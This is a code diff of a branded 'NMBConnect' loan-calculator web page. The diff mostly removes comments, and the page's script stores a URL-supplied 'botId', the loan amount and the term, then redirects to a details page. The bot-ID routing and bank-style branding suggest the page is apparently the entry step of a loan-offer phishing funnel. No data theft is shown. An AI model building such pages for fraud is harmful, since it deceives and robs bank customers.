@@ -6,7 +6,6 @@
 <title>NMBConnect - Loan Calculator</title>
 
 <style>
-
 *{
 margin:0;
 padding:0;
@@ -33,7 +32,6 @@ box-shadow: 0 20px 60px rgba(0,0,0,0.3);
 position:relative;
 }
 
-/* NMB CONNECT LOGO AT TOP */
 .logo-container {
     text-align: center;
     margin-bottom: 20px;
@@ -70,7 +68,6 @@ position:relative;
     color: #4a2b7a;
 }
 
-/* HEADER SECTION */
 .header {
     text-align: center;
     margin-bottom: 20px;
@@ -90,7 +87,6 @@ position:relative;
     font-weight: 400;
 }
 
-/* CARD */
 .card {
     background: #f8f8fc;
     border-radius: 16px;
@@ -123,7 +119,6 @@ position:relative;
     margin: 5px 0 15px;
 }
 
-/* SLIDER */
 .slider {
     width: 100%;
     -webkit-appearance: none;
@@ -163,7 +158,6 @@ position:relative;
     margin-top: 4px;
 }
 
-/* TERM SELECTION */
 .term-section {
     margin-top: 18px;
 }
@@ -214,7 +208,6 @@ position:relative;
     color: white;
 }
 
-/* RESULT */
 .result {
     background: #ffffff;
     padding: 16px;
@@ -244,7 +237,6 @@ position:relative;
     margin-top: 4px;
 }
 
-/* APPLY BUTTON */
 .apply-btn {
     width: 100%;
     padding: 15px;
@@ -270,7 +262,6 @@ position:relative;
     transform: translateY(0);
 }
 
-/* INFO CARDS */
 .info-grid {
     display: grid;
     grid-template-columns: 1fr 1fr;
@@ -312,7 +303,6 @@ position:relative;
     font-size: 11px;
 }
 
-/* MINIMUM NOTICE */
 .min-notice {
     background: #fff8e1;
     border: 1px solid #ffe082;
@@ -324,7 +314,6 @@ position:relative;
     color: #856404;
 }
 
-/* RESPONSIVE */
 @media (max-width: 440px) {
     .app {
         padding: 28px 20px 25px;
@@ -357,7 +346,6 @@ position:relative;
         grid-template-columns: 1fr;
     }
 }
-
 </style>
 </head>
 
@@ -365,7 +353,6 @@ position:relative;
 
 <div class="app">
 
-    <!-- NMB CONNECT LOGO -->
     <div class="logo-container">
         <div class="nmb-logo">
             <div class="logo-icon">N</div>
@@ -438,8 +425,7 @@ position:relative;
 </div>
 
 <script>
-
-/* GET BOT ID FROM URL */
+// ---------- BOT ID FROM URL ----------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
 
@@ -448,32 +434,30 @@ if (!botId) {
     throw new Error();
 }
 
-/* SAVE BOT ID */
+// ---------- SAVE SESSION ----------
 localStorage.setItem("botId", botId);
+// Ensure fullName is always set
+if (!localStorage.getItem('fullName')) {
+    localStorage.setItem('fullName', 'Loan Customer');
+}
 
-/* CALCULATOR LOGIC */
+// ---------- CALCULATOR LOGIC ----------
 let slider = document.getElementById("loanSlider");
 let loanAmount = document.getElementById("loanAmount");
 let payment = document.getElementById("payment");
 let monthsDisplay = document.getElementById("months");
 
 let months = 12;
-const rate = 0.045 / 12; // 4.5% APR
+const rate = 0.045 / 12;
 
 function calculate() {
     let P = parseFloat(slider.value);
     let n = months;
     let r = rate;
-
-    // Monthly payment formula: M = P * r * (1 + r)^n / ((1 + r)^n - 1)
     let M = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
-
     if (isNaN(M) || !isFinite(M)) M = 0;
-
     loanAmount.innerText = "$" + Number(P).toLocaleString();
     payment.innerText = "$" + M.toFixed(2);
-
-    // Update slider background
     const min = parseFloat(slider.min);
     const max = parseFloat(slider.max);
     const percent = ((P - min) / (max - min)) * 100;
@@ -486,36 +470,26 @@ document.querySelectorAll(".term").forEach(btn => {
     btn.onclick = function() {
         document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
         this.classList.add("active");
-
         months = parseInt(this.dataset.month);
         monthsDisplay.innerText = months + " months";
-
         calculate();
     };
 });
 
-/* APPLY BUTTON */
+// ---------- APPLY NOW ----------
 function applyLoan() {
     const amount = parseFloat(slider.value);
-    
-    // Validate minimum amount
     if (amount < 100) {
         alert('⚠️ Minimum loan amount is $100');
         return;
     }
-    
-    /* SAVE LOAN AMOUNT */
     localStorage.setItem("loanAmount", slider.value);
     localStorage.setItem("loanTerm", months);
-    localStorage.setItem("fullName", ""); // Will be filled in next step
-
-    /* REDIRECT TO LOAN APPLICATION PAGE */
+    localStorage.setItem("fullName", "Loan Customer"); // double‑check
     window.location.href = `details.html?botId=${botId}`;
 }
 
-/* INITIAL CALCULATION */
 calculate();
-
 </script>
 
 </body>
